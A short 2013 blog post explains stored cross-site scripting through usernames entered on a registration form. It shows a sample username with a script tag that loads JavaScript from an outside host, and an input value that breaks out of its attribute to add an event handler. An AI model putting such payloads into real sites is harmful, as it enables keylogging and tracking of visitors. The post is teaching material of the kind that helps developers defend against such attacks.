---
id: 1127
title: Code Injection prevention - user names
date: 2013-02-20 23:26:41
author: taimane
layout: post
permalink: /code-injection/
published: true
categories:
   -
tags:
   -
---
Code injection (often called cross-site-scripting or XSS ) is where a malicious user combines text and scripting to enter "malicious" values to your web page forms.

You have a system allowing users to register as members to your web site. Users are allowed to create their own username. 

They fill out a form, and you save the data they set to the database. 

Someone could create a user with the following username:



```
Username<script type="text/javascript"; src="http://www.blah.net/danger.js">
</script>
```



Visitors will see the username, but also external JavaScript will be loaded.

This allows attackers to add keyloggers, tracking scripts, or porn banners on your site, or just stop your site working altogether. 



There is a similar problem if someone tries to enter smt. like this in the input field. 

```
Mister XSS" onhover="some bad code
```
in the text field.



```
<input type="text" value="Mister XSS" onhover="some bad code" />
```

